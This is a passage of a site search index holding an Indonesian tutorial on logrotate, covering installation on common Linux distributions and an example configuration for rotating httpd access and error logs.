\"/var/log/httpd/access.log\" /var/log/httpd/error.log Baris berikutnya mendefine parameter untuk log httpd access.log dan error.log . rotate 5 Log akan dirotasi maksimal 5 kali, setelah itu log akan dihapus. mail recipient@example.org Log yang melebihi 5 kali rotasi akan dikirim ke email recipient@example.org . size 100k Log akan dirotasi setelah besar file 100k. sharedscripts postrotate /usr/bin/killall -HUP httpd endscript sharedscripts berarti postrotate script akan dijalankan sekali setelah log lama di-compress. Untuk lebih detailnya kalian bisa cek manual page dari logrotate dengan perintah: man logrotate","title":"Logrotate"},{"location":"linux-fun/logrotate/#manajemen-log-menggunakan-logrotate","text":"","title":"Manajemen Log Menggunakan Logrotate"},{"location":"linux-fun/logrotate/#apa-itu-logrotate","text":"Menurut manual page dari logrotate man logrotate , Logrotate adalah sebuah program yang berfungsi untuk mengotomatissai proses rotasi, kompresi, dan penghapusan log file. Logrotate menghandle (rotate, compress, delete) file log secara satuan waktu (daily, weekly, monthly), atau ukuran besar log.","title":"Apa itu logrotate?"},{"location":"linux-fun/logrotate/#bagaimana-logrotate-bekerja","text":"Logrotate bekerja dengan memanfaatkan file konfigurasi yang bisa kita kustomisasi /etc/logrotate.conf . Dalam file konfigurasi kita bisa mengatur berapa lama kita menyimpan log tersebut sebelum log tersebut akan otomatis terhapus. Selain itu kita bisa mengatus agar file log yang ada dirotasi berdasarkan satuan waktu (daily, weekly, monthly). Contoh : log file yang dirotate setiap hari selama 7 hari. # ls /var/log syslog syslog.1 syslog.2.gz syslog.3.gz syslog.4.gz syslog.5.gz syslog.6.gz Log akan dirotate, kemudian di-compress dan setelah 7 hari maka log akan otomatis dihapus.","title":"Bagaimana Logrotate Bekerja?"},{"location":"linux-fun/logrotate/#installasi","text":"Kebanyakan distribusi linux sudah terinstall logrotate secara default. Tapi jika di sistem linux kalian belum terinstall, logrotate bisa diinstall dengan perintah : RHEL/CentOS sudo yum -y install logrotate Debian/Ubuntu sudo apt -y install logrotate Fedora sudo dnf install logrotate","title":"Installasi"},{"location":"linux-fun/logrotate/#konfigurasi","text":"Contoh file konfigurasi logrotate untuk log httpd access.log & error.log . compress \"/var/log/httpd/access.log\" /var/log/httpd/error.log { rotate 5 mail recipient@example.org size 100k sharedscripts postrotate /usr/bin/killall -HUP httpd endscript } Penjelasan compress Baris pertama merupakan global options. Di contoh ini, log akan dicompress setelah log tersebut dirotasi. \"/var/log/httpd/access.log\" /var/log/httpd/error.log Baris berikutnya mendefine parameter untuk log httpd access.log dan error.log . rotate 5 Log akan dirotasi maksimal 5 kali, setelah itu log akan dihapus. mail recipient@example.org Log yang melebihi 5 kali rotasi akan dikirim ke email recipient@example.org . size 100k Log akan dirotasi setelah besar file 100k. sharedscripts postrotate /usr/bin/killall -HUP httpd endscript sharedscripts berarti postrotate script akan dijalankan sekali setelah log lama di-compress. Untuk lebih detailnya kalian bisa cek manual page dari logrotate dengan perintah: man logrotate","title":"Konfigurasi"}]}